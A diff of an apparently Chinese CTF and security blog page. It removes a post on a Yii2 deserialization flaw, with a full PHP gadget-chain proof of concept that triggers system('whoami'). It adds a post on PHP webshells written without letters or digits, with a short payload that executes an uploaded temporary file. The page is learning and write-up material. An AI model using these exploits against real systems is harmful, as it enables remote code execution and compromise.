-<p><img src="/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/image-20220226234631938.png" alt="image-20220226234631938"></p>
-<p>发现了<code>call_user_func($this-&gt;writeCallback, $this)</code>，因为<code>$this-&gt;writeCallback</code>可控，因此调用的回调函数可控。</p>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-
-namespace yii\rest{
-    class IndexAction{
-        public $checkAccess;
-        public $id;
-        public function __construct(){
-            $this-&gt;checkAccess = 'system';
-            $this-&gt;id = 'whoami';
-        }
-    }
-}
-namespace yii\db{
-
-    use yii\web\DbSession;
-
-    class BatchQueryResult
-    {
-        private $_dataReader;
-        public function __construct(){
-            $this-&gt;_dataReader=new DbSession();
-        }
-    }
-}
-namespace yii\web{
-
-    use yii\rest\IndexAction;
-
-    class DbSession
-    {
-        public $writeCallback;
-        public function __construct(){
-            $a=new IndexAction();
-            $this-&gt;writeCallback=[$a,'run'];
-        }
-    }
-}
-
-namespace{
-
-    use yii\db\BatchQueryResult;
-
-    echo base64_encode(serialize(new BatchQueryResult()));
-}
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>这道题多了两个限制：</p>
+<ol>
+<li>webshell长度不超过35位</li>
+<li>除了不包含字母数字，还不能包含<code>$</code>和<code>_</code></li>
+</ol>
+<p>上传临时文件</p>
+<p>具体原理看p神博客<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Ethan552525/article/details/118459568?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164787068316780261974367%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164787068316780261974367&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-118459568.142">https://blog.csdn.net/Ethan552525/article/details/118459568?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164787068316780261974367%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=164787068316780261974367&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-3-118459568.142</a> 具体看列题</p>
+<pre class="line-numbers language-none"><code class="language-none">?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt;"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
                 
@@ -857,7 +710,7 @@ namespace{
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://54Wa1234.github.io/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/">http://54Wa1234.github.io/2022/02/26/yii2-kuang-jia-fan-xu-lie-hua-lou-dong-fu-xian/</a>
+                    <a href="http://54Wa1234.github.io/2022/03/21/wu-shu-zi-zi-mu-rce/">http://54Wa1234.github.io/2022/03/21/wu-shu-zi-zi-mu-rce/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -895,8 +748,8 @@ namespace{
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                                    <span class="chip bg-color">反序列化</span>
+                                <a href="/tags/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/">
+                                    <span class="chip bg-color">无数字字母rce</span>
                                 </a>
                             
                         </div>
@@ -1070,45 +923,47 @@ namespace{
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/03/07/ssti-ku/">
+                <a href="/2022/03/21/wu-shu-zi-zi-mu-rce/">
                     <div class="card-image">
                         
-                        <img src="/images/ssti%E5%BA%93.jpg" class="responsive-img" alt="ssti库">
+                        <img src="/images/yii2%E6%A1%86%E6%9E%B6.jpg" class="responsive-img" alt="无数字字母rce">
                         
-                        <span class="card-title">ssti库</span>
+                        <span class="card-title">无数字字母rce</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ssti的遇到的做题写法(不定期更新)
+                            无数字字母构造webshell
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-07
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-21
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/ssti/" class="post-category">
-                                    ssti
+                            <a href="/categories/webshell/" class="post-category">
+                                    webshell
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/ssti/">
-                        <span class="chip bg-color">ssti</span>
+                    <a href="/tags/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/">
+                        <span class="chip bg-color">无数字字母rce</span>
                     </a>
                     
                 </div>
@@ -1122,30 +977,30 @@ namespace{
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/02/19/ctfshow-xss/">
+                <a href="/2022/03/08/session-an-quan/">
                     <div class="card-image">
                         
-                        <img src="/images/xss.jpg" class="responsive-img" alt="ctfshow-xss">
+                        <img src="/images/session%E5%AE%89%E5%85%A8.jpg" class="responsive-img" alt="session安全">
                         
-                        <span class="card-title">ctfshow-xss</span>
+                        <span class="card-title">session安全</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            ctfshow的xss的wp
+                            session安全
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-03-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/ctfshow/" class="post-category">
-                                    ctfshow
+                            <a href="/categories/session/" class="post-category">
+                                    session
                                 </a>
                             
                             
@@ -1155,8 +1010,8 @@ namespace{
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/xss/">
-                        <span class="chip bg-color">xss</span>
+                    <a href="/tags/session/">
+                        <span class="chip bg-color">session</span>
                     </a>
                     
                 </div>
@@ -1356,7 +1211,7 @@ namespace{
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">16.8k</span>
+                        class="white-color">18.3k</span>
             
             
             
